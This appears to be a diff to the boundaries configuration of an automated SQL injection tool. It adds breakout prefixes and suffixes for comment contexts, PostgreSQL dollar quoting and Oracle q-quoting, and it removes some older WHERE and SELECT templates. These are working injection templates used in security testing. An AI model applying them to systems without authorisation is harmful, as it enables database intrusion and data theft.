@@ -55,6 +55,8 @@ Tag: <boundary>
             4: Double quoted string
             5: LIKE double quoted string
             6: Identifier (e.g. column name)
+            7: Block comment
+            8: Alternative quoted string (e.g. PostgreSQL $$...$$, Oracle q'[...]')
 
     Sub-tag: <prefix>
         A string to prepend to the payload.
@@ -342,14 +344,6 @@ Formats:
         <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
-    <boundary>
-        <level>5</level>
-        <clause>9</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>") WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>[GENERIC_SQL_COMMENT]</suffix>
-    </boundary>
 
     <boundary>
         <level>4</level>
@@ -414,41 +408,6 @@ Formats:
         <suffix>)+'</suffix>
     </boundary>
 
-    <boundary>
-        <level>5</level>
-        <clause>9</clause>
-        <where>1</where>
-        <ptype>2</ptype>
-        <prefix>||(SELECT '[RANDSTR]' FROM DUAL WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)||</suffix>
-    </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>9</clause>
-        <where>1</where>
-        <ptype>2</ptype>
-        <prefix>||(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)||</suffix>
-    </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>9</clause>
-        <where>1</where>
-        <ptype>1</ptype>
-        <prefix>+(SELECT [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)+</suffix>
-    </boundary>
-
-    <boundary>
-        <level>5</level>
-        <clause>9</clause>
-        <where>1</where>
-        <ptype>2</ptype>
-        <prefix>+(SELECT '[RANDSTR]' WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>)+</suffix>
-    </boundary>
     <!-- End of pre-WHERE generic boundaries -->
 
     <!-- Pre-WHERE derived table boundaries - e.g. "SELECT * FROM (SELECT column FROM table WHERE column LIKE '%$_REQUEST["name"]%') AS t1"-->
@@ -461,14 +420,6 @@ Formats:
         <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1,2</where>
-        <ptype>2</ptype>
-        <prefix>")) AS [RANDSTR] WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>[GENERIC_SQL_COMMENT]</suffix>
-    </boundary>
 
     <boundary>
         <level>5</level>
@@ -510,20 +461,24 @@ Formats:
         <level>4</level>
         <clause>1</clause>
         <where>1</where>
-        <ptype>1</ptype>
+        <ptype>6</ptype>
         <prefix>` WHERE [RANDNUM]=[RANDNUM]</prefix>
         <suffix>[GENERIC_SQL_COMMENT]</suffix>
     </boundary>
 
-    <boundary>
-        <level>5</level>
-        <clause>1</clause>
-        <where>1</where>
-        <ptype>1</ptype>
-        <prefix>`) WHERE [RANDNUM]=[RANDNUM]</prefix>
-        <suffix>[GENERIC_SQL_COMMENT]</suffix>
-    </boundary>
     <!-- End of pre-WHERE derived table boundaries -->
+
+    <!-- Block-comment escape: injection point sits INSIDE /* ... */ (e.g. a query tag / trace / tenant
+         annotation). '*/' terminates the app comment, the test runs, '/*' re-opens a comment that the
+         app's original '*/' closes. Inert (stays inside the literal) when the value is not in a comment. -->
+    <boundary>
+        <level>4</level>
+        <clause>1,2,3</clause>
+        <where>1,2</where>
+        <ptype>7</ptype>
+        <prefix>*/</prefix>
+        <suffix>/*</suffix>
+    </boundary>
 
     <!-- Escaped column name (e.g. SELECT `...` FROM table) boundaries -->
     <boundary>
@@ -554,6 +509,15 @@ Formats:
     </boundary>
     <!-- End of escaped column name boundaries -->
 
+    <boundary>
+        <level>5</level>
+        <clause>7</clause>
+        <where>1</where>
+        <ptype>6</ptype>
+        <prefix> [RANDSTR1],</prefix>
+        <suffix> [RANDSTR2]</suffix>
+    </boundary>
+
     <!-- AGAINST boolean full-text search boundaries (http://dev.mysql.com/doc/refman/5.5/en/fulltext-boolean.html) -->
     <boundary>
         <level>4</level>
@@ -564,4 +528,48 @@ Formats:
         <suffix>#</suffix>
     </boundary>
     <!-- End of AGAINST boolean full-text search boundaries -->
+
+    <!-- Alternative quoted string delimiters where ' and " have no terminating effect:
+         PostgreSQL $$...$$ dollar quoting, Oracle q'[...]' / q'{...}' / q'(...)' / q'<...>'. -->
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>8</ptype>
+        <prefix>$$</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>8</ptype>
+        <prefix>]'</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>8</ptype>
+        <prefix>}'</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>8</ptype>
+        <prefix>)'</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+    <boundary>
+        <level>5</level>
+        <clause>1</clause>
+        <where>1,2</where>
+        <ptype>8</ptype>
+        <prefix>&gt;'</prefix>
+        <suffix>[GENERIC_SQL_COMMENT]</suffix>
+    </boundary>
+    <!-- End of alternative quoted string boundaries -->
 </root>
